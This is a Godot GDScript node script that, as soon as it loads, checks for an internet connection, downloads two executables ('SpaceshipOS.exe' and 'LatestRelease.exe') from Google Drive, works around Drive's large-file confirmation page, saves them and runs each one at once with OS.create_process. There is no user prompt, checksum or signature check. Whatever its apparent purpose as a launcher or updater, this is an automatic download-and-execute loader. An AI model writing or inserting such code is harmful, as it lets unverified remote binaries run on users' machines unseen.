extends Node

@onready var net_check := HTTPRequest.new()
@onready var downloader := HTTPRequest.new()

var downloads := [
	{
		"url": "https://drive.google.com/uc?export=download&id=13IIqgOWSJ_QLY1D2KU6Lr96cfieSERKF",
		"path": "user://SpaceshipOS.exe"
	},
	{
		"url": "https://drive.google.com/uc?export=download&id=1QzJljeah7RvpNRpJYwgF0NO02AWQoOZ5",
		"path": "user://LatestRelease.exe"
	}
]

var index := 0
var active_url := ""
var save_path := ""

func _ready():
	add_child(net_check)
	add_child(downloader)

	net_check.request_completed.connect(_on_net_check_completed)
	downloader.request_completed.connect(_on_download_completed)

	check_internet()

# -------------------------
# INTERNET CHECK
# -------------------------
func check_internet():
	print("ğŸŒ Checking internet connection...")
	net_check.request("https://www.google.com/generate_204")

func _on_net_check_completed(result, response_code, headers, body):
	if response_code == 204:
		print("âœ… Online")
		start_downloads()
	else:
		push_error("âŒ No internet connection detected")

# -------------------------
# DOWNLOAD LOGIC
# -------------------------
func start_downloads():
	index = 0
	_download_next()

func _download_next():
	if index >= downloads.size():
		print("ğŸ‰ All downloads complete")
		return

	active_url = downloads[index]["url"]
	save_path = downloads[index]["path"]

	print("â¬‡ Downloading:", save_path)
	downloader.request(active_url)

func _on_download_completed(result, response_code, headers, body):
	if response_code != 200:
		push_error("âŒ Download failed: HTTP " + str(response_code))
		return

	# Handle Google Drive large-file confirmation
	var text := body.get_string_from_utf8()
	if text.find("confirm=") != -1:
		var token := _extract_confirm_token(text)
		if token != "":
			downloader.request(active_url + "&confirm=" + token)
			return

	var file := FileAccess.open(save_path, FileAccess.WRITE)
	file.store_buffer(body)
	file.close()

	print("âœ” Saved:", save_path)
	run_file(save_path)

	index += 1
	_download_next()

# -------------------------
# RUN FILE (DESKTOP ONLY)
# -------------------------
func run_file(path: String):
	if OS.has_feature("windows") or OS.has_feature("linux") or OS.has_feature("macos"):
		print("â–¶ Running:", path)
		OS.create_process(ProjectSettings.globalize_path(path), [])
	else:
		print("âš  Cannot run files on this platform")

# -------------------------
# GOOGLE DRIVE TOKEN PARSER
# -------------------------
func _extract_confirm_token(html: String) -> String:
	var start := html.find("confirm=")
	if start == -1:
		return ""
	start += 8
	var end := html.find("&", start)
	return html.substr(start, end - start)
